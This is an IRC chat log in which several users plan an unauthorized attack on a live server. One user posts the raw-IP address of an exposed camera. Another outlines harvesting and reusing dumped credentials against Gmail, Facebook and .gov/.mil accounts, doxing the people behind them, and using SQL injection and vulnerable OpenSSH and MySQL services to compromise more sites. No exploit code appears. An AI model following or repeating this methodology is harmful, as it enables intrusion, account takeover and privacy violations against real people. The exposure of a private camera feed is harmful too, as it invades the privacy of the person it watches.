Jun 10 23:17:26 <Mutiny>	its lulzy just how much shit google can find me
Jun 10 23:17:36 <Mutiny>	http://202.212.193.26:555/CgiStart?page=Single&Mode=Motion&Language=0 <-- random camera
Jun 10 23:17:45 <TylerDurden>	yeah.
Jun 10 23:17:58 <TylerDurden>	The basic idea is: GET INFORMATION
Jun 10 23:18:02 <TylerDurden>	See the shit they are running.
Jun 10 23:18:05 <TylerDurden>	Search for known exploits.
Jun 10 23:18:06 <TylerDurden>	can't find one? make one.
Jun 10 23:18:13 <TylerDurden>	You know shit code when you see it.
Jun 10 23:18:39 <TylerDurden>	So, anyone fancy a go at a real server, @ info gathering?

Jun 10 23:23:30 <LordKitsuna>	try setting your comp to use googledns

Jun 10 23:49:26 <TylerDurden>	right, we see if they REUSE the shit pass on the db, we see if we can use the db login for michief, we see if we can extract tables and dox.
Jun 10 23:49:37 <TylerDurden>	first one to get dox can use them.
Jun 10 23:49:46 <TylerDurden>	how 2 use dox:
Jun 10 23:49:52 <TylerDurden>	you write a bash scripts that remove dups.
Jun 10 23:49:57 <TylerDurden>	using sed/grep
Jun 10 23:50:07 <ref>	can i use perl lol
Jun 10 23:50:24 <TylerDurden>	sure.
Jun 10 23:50:24 <TylerDurden>	you then try these dox against common sites, gmail facebook etc.
Jun 10 23:50:30 <TylerDurden>	you dump the ones that have .gov .mil extensions or are reused.
Jun 10 23:50:38 <TylerDurden>	you see if you can use those to root MORE sites.
Jun 10 23:50:48 <Hellspawn>	LOL @ camera
Jun 10 23:50:51 <Hellspawn>	she saw it move
Jun 10 23:51:17 <TylerDurden>	now for the people more into exploiting, this server runs a vulnerable openssh too.
Jun 10 23:51:21 <TylerDurden>	so it's pretty much the ideal test target.
Jun 10 23:51:31 <TylerDurden>	and a vulnerable mysql, you can load modules.
Jun 10 23:51:35 <JBAIT>	bra shot XD
Jun 10 23:51:44 <TylerDurden>	post ling.

Jun 10 23:53:37 <TylerDurden>	ok. now that you know how2sqli, you're pretty much on par with GFORCE PAKISTAN/INDIAN kiddies.
Jun 10 23:53:55 <TylerDurden>	we cant write to wwwroot tough, and this is annoying.
Jun 10 23:53:59 <TylerDurden>	we have a sql user and sql exploits.
Jun 10 23:54:09 <TylerDurden>	exploitin' that is left as an exercise to the reader.
